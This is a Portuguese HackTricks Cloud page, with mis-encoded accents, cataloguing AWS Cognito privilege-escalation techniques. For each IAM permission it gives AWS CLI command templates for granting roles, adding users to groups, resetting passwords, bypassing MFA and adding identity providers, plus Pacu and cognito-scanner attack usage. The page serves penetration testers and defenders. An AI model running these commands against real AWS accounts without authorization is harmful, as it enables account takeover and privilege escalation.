# AWS - Escala√ß√£o de Privil√©gios no Cognito

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Cognito

Para mais informa√ß√µes sobre o Cognito, verifique:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Ferramentas

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), o framework de explora√ß√£o da AWS, agora inclui os m√≥dulos "cognito\_\_enum" e "cognito\_\_attack" que automatizam a enumera√ß√£o de todos os ativos do Cognito em uma conta e sinalizam configura√ß√µes fracas, atributos de usu√°rio usados para controle de acesso, etc., e tamb√©m automatizam a cria√ß√£o de usu√°rios (incluindo suporte para MFA) e escalonamento de privil√©gios com base em atributos personaliz√°veis modific√°veis, credenciais de pool de identidade utiliz√°veis, fun√ß√µes assum√≠veis em tokens de ID, etc.

Para uma descri√ß√£o das fun√ß√µes dos m√≥dulos, consulte a parte 2 do [post do blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instru√ß√µes de instala√ß√£o, consulte a p√°gina principal do [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Exemplo de uso do ataque cognito\_\_attack para tentar a cria√ß√£o de usu√°rios e todos os vetores de escalonamento de privil√©gios contra um determinado pool de identidade e cliente de pool de usu√°rios:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Exemplo de uso do cognito\_\_enum para reunir todos os grupos de usu√°rios, clientes de grupos de usu√°rios, pools de identidade, usu√°rios, etc. vis√≠veis na conta AWS atual:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) √© uma ferramenta CLI em python que implementa diferentes ataques no Cognito, incluindo uma escalada de privil√©gios.

#### Instala√ß√£o
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para mais informa√ß√µes, acesse https://github.com/padok-team/cognito-scanner

### Coleta de credenciais do Identity Pool

Como o Cognito pode conceder **credenciais de fun√ß√£o IAM** tanto para **usu√°rios autenticados** quanto para **n√£o autenticados**, se voc√™ localizar o **ID do Identity Pool** de um aplicativo (que deve estar codificado nele), voc√™ pode obter novas credenciais e, portanto, realizar uma escalada de privil√©gios (dentro de uma conta AWS onde provavelmente voc√™ nem tinha credenciais anteriormente).

Para mais informa√ß√µes [**verifique esta p√°gina**](../aws-unauthenticated-enum-access/#cognito).

**Impacto Potencial:** Escalada direta para a fun√ß√£o de servi√ßos anexada aos usu√°rios n√£o autenticados (e provavelmente para a fun√ß√£o anexada aos usu√°rios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Com essa permiss√£o, voc√™ pode **conceder qualquer fun√ß√£o do Cognito** aos usu√°rios autenticados/n√£o autenticados do aplicativo Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Se o aplicativo cognito **n√£o tiver usu√°rios n√£o autenticados habilitados**, voc√™ tamb√©m pode precisar da permiss√£o `cognito-identity:UpdateIdentityPool` para habilit√°-los.

**Impacto Potencial:** Privesc direto para qualquer fun√ß√£o cognito.

### `cognito-identity:update-identity-pool`

Um atacante com essa permiss√£o poderia, por exemplo, configurar um Pool de Usu√°rios Cognito sob seu controle ou qualquer outro provedor de identidade onde ele possa fazer login como uma **forma de acessar este Pool de Identidade Cognito**. Em seguida, apenas **fazer login** nesse provedor de usu√°rios ir√° **permitir que ele acesse a fun√ß√£o autenticada configurada no Pool de Identidade**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tamb√©m √© poss√≠vel **abusar dessa permiss√£o para permitir autentica√ß√£o b√°sica**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impacto Potencial**: Comprometer a fun√ß√£o IAM autenticada configurada dentro do pool de identidade.

### `cognito-idp:AdminAddUserToGroup`

Esta permiss√£o permite **adicionar um usu√°rio Cognito a um grupo Cognito**, portanto, um atacante poderia abusar dessa permiss√£o para adicionar um usu√°rio sob seu controle a outros grupos com **privil√©gios melhores** ou **fun√ß√µes IAM diferentes**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impacto Potencial:** Escala√ß√£o de privil√©gios para outros grupos Cognito e fun√ß√µes IAM anexadas aos Grupos de Pool de Usu√°rios.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Um atacante com essas permiss√µes poderia **criar/atualizar grupos** com **cada fun√ß√£o IAM que pode ser usada por um Provedor de Identidade Cognito comprometido** e fazer com que um usu√°rio comprometido fa√ßa parte do grupo, acessando todas essas fun√ß√µes:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto Potencial:** Escala√ß√£o de privil√©gios para outros pap√©is IAM do Cognito.

### `cognito-idp:AdminConfirmSignUp`

Esta permiss√£o permite **verificar uma inscri√ß√£o**. Por padr√£o, qualquer pessoa pode se inscrever em aplicativos Cognito; se isso for deixado assim, um usu√°rio poderia criar uma conta com qualquer dado e verific√°-la com essa permiss√£o.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Privesc indireto para a fun√ß√£o IAM do pool de identidades para usu√°rios autenticados se voc√™ puder registrar um novo usu√°rio. Privesc indireto para outras funcionalidades do aplicativo sendo capaz de confirmar qualquer conta.

### `cognito-idp:AdminCreateUser`

Essa permiss√£o permitiria a um atacante criar um novo usu√°rio dentro do pool de usu√°rios. O novo usu√°rio √© criado como habilitado, mas precisar√° alterar sua senha.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impacto Potencial:** Privesc direto para a fun√ß√£o IAM do pool de identidade para usu√°rios autenticados. Privesc indireto para outras funcionalidades do aplicativo, podendo criar qualquer usu√°rio

### `cognito-idp:AdminEnableUser`

Essas permiss√µes podem ajudar em um cen√°rio muito espec√≠fico em que um atacante encontrou as credenciais de um usu√°rio desabilitado e precisa **habilit√°-lo novamente**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Privesc indireto para a fun√ß√£o IAM do pool de identidades para usu√°rios autenticados e permiss√µes do usu√°rio se o atacante tiver credenciais de um usu√°rio desabilitado.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Essa permiss√£o permite fazer login com o [**m√©todo ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Para mais informa√ß√µes, siga o link.

### `cognito-idp:AdminSetUserPassword`

Essa permiss√£o permitiria a um atacante **alterar a senha de qualquer usu√°rio**, permitindo que ele se passe por qualquer usu√°rio (que n√£o tenha MFA habilitado).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impacto Potencial:** Privesc direto para potencialmente qualquer usu√°rio, portanto, acesso a todos os grupos dos quais cada usu√°rio √© membro e acesso √† fun√ß√£o IAM autenticada do Identity Pool.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Um atacante poderia potencialmente abusar dessa permiss√£o para definir um telefone celular sob seu controle como **MFA SMS de um usu√°rio**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Semelhante ao anterior, essa permiss√£o pode ser usada para definir as prefer√™ncias de MFA de um usu√°rio para contornar a prote√ß√£o de MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Semelhante ao anterior, essa permiss√£o pode ser usada para definir as prefer√™ncias de MFA de um pool de usu√°rios para contornar a prote√ß√£o de MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tamb√©m √© poss√≠vel atualizar o pool de usu√°rios para alterar a pol√≠tica de MFA. [Verifique o cli aqui](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impacto Potencial:** Privil√©gio indireto de escalonamento para potencialmente qualquer usu√°rio de quem o atacante conhece as credenciais, isso poderia permitir contornar a prote√ß√£o de MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Um atacante com essa permiss√£o poderia alterar o e-mail ou n√∫mero de telefone ou qualquer outro atributo de um usu√°rio sob seu controle para tentar obter mais privil√©gios em um aplicativo subjacente.\
Isso permite alterar um e-mail ou n√∫mero de telefone e defini-lo como verificado.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impacto Potencial:** Poss√≠vel privesc indireto na aplica√ß√£o subjacente usando Cognito User Pool que concede privil√©gios com base em atributos do usu√°rio.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Um atacante com essa permiss√£o poderia **criar um novo Cliente de Pool de Usu√°rios menos restrito** do que os clientes de pool existentes. Por exemplo, o novo cliente poderia permitir qualquer tipo de m√©todo de autentica√ß√£o, n√£o ter nenhum segredo, ter a revoga√ß√£o de token desativada, permitir que os tokens sejam v√°lidos por um per√≠odo mais longo...

O mesmo pode ser feito se, em vez de criar um novo cliente, um **existente for modificado**.

No [**linha de comando**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ou no [**atualizar**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) voc√™ pode ver todas as op√ß√µes, confira!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impacto Potencial:** Poss√≠vel privesc indireto para o usu√°rio autorizado do Pool de Identidade usado pelo Pool de Usu√°rios, criando um novo cliente que relaxa as medidas de seguran√ßa e possibilita a um atacante fazer login com um usu√°rio que ele foi capaz de criar.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Um atacante poderia abusar dessa permiss√£o para criar usu√°rios fazendo upload de um arquivo csv com novos usu√°rios.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potencial Impacto:** Escala√ß√£o de privil√©gios diretos para a fun√ß√£o IAM do pool de identidades para usu√°rios autenticados. Escala√ß√£o de privil√©gios indiretos para outras funcionalidades do aplicativo, podendo criar qualquer usu√°rio.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Um atacante poderia criar um novo provedor de identidade para ent√£o ser capaz de **fazer login por meio desse provedor**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impacto Potencial:** Privesc direto para a fun√ß√£o IAM do pool de identidade para usu√°rios autenticados. Privesc indireto para outras funcionalidades do aplicativo sendo capaz de criar qualquer usu√°rio.

### An√°lise cognito-sync:\*

Esta √© uma permiss√£o muito comum por padr√£o em fun√ß√µes de Pools de Identidade do Cognito. Mesmo que um wildcard em permiss√µes sempre pare√ßa ruim (especialmente vindo da AWS), as **permiss√µes concedidas n√£o s√£o super √∫teis do ponto de vista de um atacante**.

Essa permiss√£o permite ler informa√ß√µes de uso de Pools de Identidade e IDs de Identidade dentro das Pools de Identidade (que n√£o s√£o informa√ß√µes sens√≠veis).\
IDs de Identidade podem ter [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) atribu√≠dos a eles, que s√£o informa√ß√µes das sess√µes (a AWS define como um **jogo salvo**). Pode ser poss√≠vel que isso contenha algum tipo de informa√ß√£o sens√≠vel (mas a probabilidade √© bem baixa). Voc√™ pode encontrar na [**p√°gina de enumera√ß√£o**](../aws-services/aws-cognito-enum/) como acessar essas informa√ß√µes.

Um atacante tamb√©m poderia usar essas permiss√µes para **se inscrever em um stream do Cognito que publica altera√ß√µes** nesses datasets ou um **lambda que dispara em eventos do cognito**. N√£o vi isso sendo usado e n√£o esperaria informa√ß√µes sens√≠veis aqui, mas n√£o √© imposs√≠vel.

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
